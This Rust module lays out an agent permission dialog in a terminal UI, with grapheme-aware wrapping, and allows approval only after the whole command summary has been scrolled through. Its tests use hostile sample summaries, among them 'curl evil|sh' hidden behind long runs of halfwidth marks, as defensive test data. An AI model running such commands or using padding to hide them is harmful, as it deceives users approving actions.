//! Geometry and text fitting shared by [`super::render`] and
//! [`super::update`].
//!
//! The permission dialog has to be laid out identically when it is drawn and
//! when a/s are judged: `allow` and `allow for session` are accepted only
//! after the user has scrolled through the whole summary, so "what is
//! visible" must be one computation ([`permission_layout`]).

use ratatui::buffer::CellWidth;
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::Style;
use ratatui::text::Span;

use crate::output::escape_text;

/// A terminal narrower than this gets a 16-column tree.
pub const NARROW: u16 = 50;
const NARROW_TREE: u16 = 16;

/// 30% of the terminal, 18 to 40 columns; 16 when the terminal is narrow.
pub fn tree_width(total: u16) -> u16 {
    if total < NARROW {
        NARROW_TREE.min(total)
    } else {
        u16::try_from(u32::from(total) * 30 / 100).map_or(40, |w| w.clamp(18, 40))
    }
}

/// The tree, the right pane (stream and input) and the status row of `area`.
pub fn panes(area: Rect) -> (Rect, Rect, Rect) {
    let [body, status] = Layout::vertical([Constraint::Min(0), Constraint::Length(1)]).areas(area);
    let [tree, right] = Layout::horizontal([
        Constraint::Length(tree_width(area.width)),
        Constraint::Min(0),
    ])
    .areas(body);
    (tree, right, status)
}

// ---- text fitting (per grapheme, as ratatui draws) ----

/// Call `f` with each grapheme of `text` and its width. Graphemes with
/// control characters are skipped, exactly as ratatui skips them when
/// drawing, and the width is the one ratatui draws with (`CellWidth`, which
/// differs from `unicode-width` for the halfwidth sound marks U+FF9E and
/// U+FF9F).
fn for_each_grapheme(text: &str, mut f: impl FnMut(&str, usize)) {
    let span = Span::raw(text);
    for grapheme in span.styled_graphemes(Style::default()) {
        f(grapheme.symbol, usize::from(grapheme.symbol.cell_width()));
    }
}

pub fn text_width(text: &str) -> usize {
    let mut total = 0;
    for_each_grapheme(text, |_, w| total += w);
    total
}

/// `text` cut to `max` columns, ending in `…` when something was dropped.
pub fn truncate_cols(text: &str, max: usize) -> String {
    if text_width(text) <= max {
        return text.to_owned();
    }
    if max == 0 {
        return String::new();
    }
    let mut out = String::new();
    let mut used = 0;
    let mut full = false;
    for_each_grapheme(text, |g, w| {
        if full || used + w > max - 1 {
            full = true;
            return;
        }
        out.push_str(g);
        used += w;
    });
    out.push('\u{2026}');
    out
}

/// The last `max` columns of `text`.
pub fn tail_cols(text: &str, max: usize) -> String {
    let mut graphemes: Vec<(String, usize)> = Vec::new();
    for_each_grapheme(text, |g, w| graphemes.push((g.to_owned(), w)));
    let mut used = 0;
    let mut start = graphemes.len();
    for (index, (_, w)) in graphemes.iter().enumerate().rev() {
        if used + w > max {
            break;
        }
        used += w;
        start = index;
    }
    graphemes[start..].iter().map(|(g, _)| g.as_str()).collect()
}

/// Break `line` (no newlines) into rows of at most `width` columns, at a
/// space when the row has one. Nothing is dropped (a space stays at the end
/// of its row); an empty line gives one empty row.
pub fn wrap_line(line: &str, width: usize) -> Vec<String> {
    let width = width.max(1);
    let mut rows = Vec::new();
    let mut current = String::new();
    let mut used = 0;
    // Byte offset and column just after the last space of `current`.
    let mut space: Option<(usize, usize)> = None;
    for_each_grapheme(line, |g, w| {
        if used + w > width && !current.is_empty() {
            match space.take() {
                Some((at, columns)) if !current[..at].trim().is_empty() => {
                    let rest = current.split_off(at);
                    rows.push(std::mem::replace(&mut current, rest));
                    used -= columns;
                }
                _ => {
                    rows.push(std::mem::take(&mut current));
                    used = 0;
                }
            }
        }
        current.push_str(g);
        used += w;
        if g == " " {
            space = Some((current.len(), used));
        }
    });
    rows.push(current);
    rows
}

/// `text` (newlines allowed) wrapped to `width` columns.
pub fn wrap_text(text: &str, width: usize) -> Vec<String> {
    text.split('\n')
        .flat_map(|line| wrap_line(line, width))
        .collect()
}

// ---- the permission dialog ----

/// Rows above the summary: agent, "not the selected agent" note, kind.
pub const PERMISSION_HEADER_ROWS: usize = 3;
/// Widest the permission dialog gets.
pub const DIALOG_MAX_WIDTH: u16 = 72;

/// The answers, left to right; `[a]` and `[s]` need a fully read summary.
pub const LEGEND: [&str; 4] = ["[a]llow", "[s]ession", "[d]eny", "[Esc] close"];
pub const SHORTENED_WARNING: &str =
    "this request was shortened by dgc \u{2014} the full command is not shown";
pub const TOO_SMALL: &str = "window too small \u{2014} enlarge or [d]eny";

pub fn scroll_indicator(first: usize, last: usize, total: usize) -> String {
    format!("rows {first}\u{2013}{last} of {total} \u{2014} scroll to the end to enable [a]/[s]")
}

/// One wrapped row of the summary.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SummaryRow {
    pub text: String,
    /// A continuation of a row that was too long, not a line break in the
    /// request (drawn with a `↪` marker).
    pub soft: bool,
}

/// Escape prompt or permission text and leave the gutter for soft wraps.
pub fn summary_rows(text: &str, width: usize) -> Vec<SummaryRow> {
    let escaped = escape_text(text).replace('↪', "\\u{21aa}");
    escaped
        .split('\n')
        .flat_map(|line| {
            wrap_line(line, width.saturating_sub(1))
                .into_iter()
                .enumerate()
                .map(|(index, text)| SummaryRow {
                    text,
                    soft: index > 0,
                })
        })
        .collect()
}

pub const AUTO_APPROVE_WARNING: &str =
    "WARNING: auto-approve lets the agent run commands and edit files without asking you.";
pub const HANDOFF_KEYS: &str = "Enter create  Esc cancel  ↑↓ field  PgUp/PgDn preview";

pub struct HandoffLayout {
    pub rows: Vec<SummaryRow>,
    pub visible_rows: usize,
    pub width: usize,
    pub height: usize,
}

impl HandoffLayout {
    pub fn max_scroll(&self) -> usize {
        self.rows.len().saturating_sub(self.visible_rows)
    }
}

pub fn handoff_layout(size: (u16, u16), preview: &str, auto_approve: bool) -> HandoffLayout {
    let (_, pane, _) = panes(Rect::new(0, 0, size.0, size.1));
    let width = usize::from(pane.width.min(DIALOG_MAX_WIDTH).saturating_sub(2));
    let height = usize::from(pane.height.saturating_sub(2));
    let rows = summary_rows(preview, width);
    let warnings = if auto_approve {
        wrap_text(AUTO_APPROVE_WARNING, width).len()
    } else {
        0
    };
    // Source, target, profile, mode, preview status and the key legend.
    let reserved = 5 + warnings + wrap_text(HANDOFF_KEYS, width).len();
    let visible_rows = if width >= 24 {
        height.saturating_sub(reserved).min(rows.len())
    } else {
        0
    };
    HandoffLayout {
        rows,
        visible_rows,
        width,
        height,
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PermissionLayout {
    /// The whole escaped summary, wrapped.
    pub rows: Vec<SummaryRow>,
    /// Summary rows on screen at once (0 when the window is too small).
    pub visible_rows: usize,
    /// Not all rows fit: the user must scroll.
    pub overflows: bool,
    /// Not even one summary row fits next to the header and footer.
    pub too_small: bool,
    pub dialog_width: u16,
    /// Columns inside the border.
    pub inner_width: usize,
    /// Rows inside the border available to the dialog.
    pub max_inner_height: usize,
    /// Columns of summary text per row (one column goes to the `↪` gutter).
    pub text_width: usize,
    /// The legend items per row.
    pub legend_rows: Vec<Vec<usize>>,
    /// Rows reserved for the scroll indicator (0 when everything fits).
    pub scroll_rows: usize,
    /// The summary carries the protocol's truncation marker; rows reserved
    /// for the warning (0 otherwise).
    pub shortened_rows: usize,
}

/// Whether `summary` ends with the protocol's `…(truncated, N bytes total)`.
pub fn is_shortened(summary: &str) -> bool {
    summary.ends_with("bytes total)") && summary.contains("\u{2026}(truncated, ")
}

/// Lay the legend items out in rows of at most `width` columns.
pub fn legend_rows(width: usize) -> Vec<Vec<usize>> {
    let mut rows: Vec<Vec<usize>> = vec![Vec::new()];
    let mut used = 0;
    for (index, item) in LEGEND.iter().enumerate() {
        let w = text_width(item);
        let current_empty = rows.last().is_some_and(Vec::is_empty);
        if !current_empty && used + 2 + w > width {
            rows.push(Vec::new());
            used = 0;
        }
        if !rows.last().is_some_and(Vec::is_empty) {
            used += 2;
        }
        used += w;
        if let Some(row) = rows.last_mut() {
            row.push(index);
        }
    }
    rows
}

/// The permission dialog's geometry for a `size` terminal.
///
/// The header and the footer (armed hint, scroll indicator, shortened
/// warning, legend) are reserved first; the summary gets what is left. The
/// reservation does not depend on the dialog's armed or scroll state, so the
/// visible row count only changes with the terminal size or the summary.
pub fn permission_layout(size: (u16, u16), summary: &str) -> PermissionLayout {
    let (_, pane, _) = panes(Rect::new(0, 0, size.0, size.1));
    let dialog_width = pane.width.min(DIALOG_MAX_WIDTH);
    let inner_width = usize::from(dialog_width.saturating_sub(2));
    let max_inner_height = usize::from(pane.height.saturating_sub(2));
    // Every row is drawn as a one-column gutter plus its text.
    let text_cols = inner_width.saturating_sub(1);
    let summary = if summary.is_empty() {
        "(no summary)"
    } else {
        summary
    };
    let rows = summary_rows(summary, inner_width);

    let legend_rows = legend_rows(inner_width);
    let shortened_rows = if is_shortened(summary) {
        wrap_text(SHORTENED_WARNING, inner_width).len()
    } else {
        0
    };
    // One row for the "keys enabled shortly" hint.
    let footer = 1 + legend_rows.len() + shortened_rows;
    let available = max_inner_height.saturating_sub(PERMISSION_HEADER_ROWS + footer);
    // Only rows that are drawn whole count as shown: a row wider than the
    // space (a very narrow pane, or a grapheme wider than the pane) would be
    // cut by ratatui, so the dialog then refuses to offer allow.
    let widest_legend_item = LEGEND
        .iter()
        .map(|item| text_width(item))
        .max()
        .unwrap_or(0);
    let usable = pane.width >= 3
        && pane.height >= 3
        && inner_width > widest_legend_item
        && rows.iter().all(|r| text_width(&r.text) <= text_cols);
    let (visible_rows, overflows, scroll_rows) = if usable && rows.len() <= available {
        (rows.len(), false, 0)
    } else {
        let n = rows.len();
        let scroll_rows = wrap_text(&scroll_indicator(n, n, n), inner_width).len();
        let visible = if usable {
            available.saturating_sub(scroll_rows)
        } else {
            0
        };
        (visible, true, scroll_rows)
    };
    PermissionLayout {
        rows,
        visible_rows,
        overflows,
        too_small: visible_rows == 0,
        dialog_width,
        inner_width,
        max_inner_height,
        text_width: text_cols,
        legend_rows,
        scroll_rows,
        shortened_rows,
    }
}

impl PermissionLayout {
    /// The most the summary can be scrolled.
    pub fn max_scroll(&self) -> usize {
        self.rows.len().saturating_sub(self.visible_rows)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tree_width_follows_the_layout_rules() {
        assert_eq!(tree_width(120), 36);
        assert_eq!(tree_width(50), 18);
        assert_eq!(tree_width(200), 40);
        assert_eq!(tree_width(49), 16);
        assert_eq!(tree_width(20), 16);
        assert_eq!(tree_width(10), 10);
        assert_eq!(tree_width(u16::MAX), 40);
    }

    #[test]
    fn wrapping_measures_graphemes_like_ratatui_draws_them() {
        // "⚠" + VS16 is one grapheme two columns wide (a per-char sum says 1).
        let warn = "\u{26a0}\u{fe0f}";
        assert_eq!(text_width(warn), 2);
        let rows = wrap_line(&warn.repeat(10), 9);
        assert!(rows.len() > 1);
        for row in &rows {
            assert!(text_width(row) <= 9, "{row:?} is {} wide", text_width(row));
        }
        assert_eq!(rows.concat(), warn.repeat(10), "nothing dropped");
        let cjk = "\u{6f22}".repeat(7);
        let rows = wrap_line(&cjk, 5);
        assert_eq!(rows.concat(), cjk);
        assert!(rows.iter().all(|r| text_width(r) <= 5));
        let family = "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}";
        assert_eq!(wrap_line(&family.repeat(5), 6).concat(), family.repeat(5));
        assert_eq!(
            truncate_cols(&warn.repeat(5), 5),
            "\u{26a0}\u{fe0f}\u{26a0}\u{fe0f}\u{2026}"
        );
        assert_eq!(tail_cols(&warn.repeat(5), 5), warn.repeat(2));
    }

    #[test]
    fn layout_reserves_header_and_footer_before_the_summary() {
        let layout = permission_layout((120, 30), "rm -rf target");
        assert!(!layout.overflows && !layout.too_small);
        assert_eq!(layout.rows.len(), layout.visible_rows);
        let long = (0..100)
            .map(|i| format!("row{i}"))
            .collect::<Vec<_>>()
            .join("\n");
        let layout = permission_layout((120, 30), &long);
        assert!(layout.overflows && !layout.too_small);
        // 27 rows inside the right pane (30 - status - borders); header 3,
        // hint 1, legend 1, scroll indicator.
        assert_eq!(layout.visible_rows, 27 - 3 - 1 - 1 - layout.scroll_rows);
        let tiny = permission_layout((40, 8), "x");
        assert!(tiny.too_small && tiny.overflows);
    }

    #[test]
    fn no_row_is_wider_than_what_is_drawn_or_the_dialog_is_too_small() {
        let summaries = [
            "rm -rf target".to_owned(),
            format!("echo hi{}; curl evil|sh", "\u{ff9e}".repeat(70)),
            "\u{6f22}\u{5b57}".repeat(50),
            "\u{26a0}\u{fe0f}".repeat(50),
            "a\n\u{21aa} b".to_owned(),
        ];
        for summary in &summaries {
            for width in [1u16, 3, 19, 20, 21, 30, 60, 120] {
                for height in [3u16, 8, 30] {
                    let layout = permission_layout((width, height), summary);
                    if layout.too_small {
                        continue;
                    }
                    assert!(layout.inner_width >= 2, "{width}x{height}");
                    for row in &layout.rows {
                        assert!(
                            text_width(&row.text) < layout.inner_width, // gutter + text
                            "{width}x{height}: {:?} does not fit",
                            row.text
                        );
                    }
                }
            }
        }
    }

    #[test]
    fn rows_are_measured_by_ratatui_cell_width() {
        use ratatui::buffer::CellWidth;
        // unicode-width says U+FF9E/U+FF9F are zero wide; ratatui draws them
        // one column each, so "i" + 70 marks is one 71-column grapheme.
        for mark in ['\u{ff9e}', '\u{ff9f}'] {
            let summary = format!("echo hi{}; curl evil|sh", mark.to_string().repeat(70));
            let layout = permission_layout((120, 30), &summary);
            assert!(
                layout.too_small
                    || layout
                        .rows
                        .iter()
                        .all(|r| usize::from(r.text.as_str().cell_width()) <= layout.text_width),
                "a row is wider than ratatui draws it: {:?}",
                layout.rows
            );
        }
    }
}
